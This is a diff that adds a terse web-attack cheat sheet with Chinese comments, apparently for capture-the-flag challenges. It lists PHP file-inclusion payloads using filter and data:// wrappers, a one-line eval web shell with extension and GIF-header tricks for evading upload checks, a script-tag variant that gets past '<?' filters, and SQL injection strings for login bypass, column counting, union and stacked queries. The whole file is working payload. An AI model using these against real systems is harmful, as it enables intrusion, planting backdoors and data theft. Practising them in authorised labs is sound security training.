@@ -1,0 +1,29 @@
+?file=pHp://filter/convert.base64-encode/resource=flag.php
+?page=data://text/plain,<?php show_source("fl4gisisish3r3.php")?>
+?page=data://text/plain;base64,PD9waHAgc2hvd19zb3VyY2UoImZsNGdpc2lzaXNoM3IzLnBocCIpPz4=
+
+<?php @eval($_POST['a']);?>
+php,php3,php4,php5,phtml,pht,pHp                       # 一句话马文件后缀
+GIF89a                                                 # 文件头绕过图片检测
+<script language="pHp">@eval($_POST['a'])</script>     # 绕过<?检测
+
+# sql万能公式
+SELECT * FROM t_user WHERE username = 'xxx' and password = "xxxx"
+admin and 1=1
+admin' and '1'='1
+admin or 1=1
+admin' or '1'='1
+admin' or '1'='1 #
+
+# 测试字段数
+1' order by 1 #
+
+# union注入
+1' union select 1,2#
+
+# 堆叠注入
+1'; show databases; #
+1'; show tables; #
+1'; show columns from Flag; #
+# 表名为数字时，反引号括起来
+1'; show columns from `1919810931114514`; #
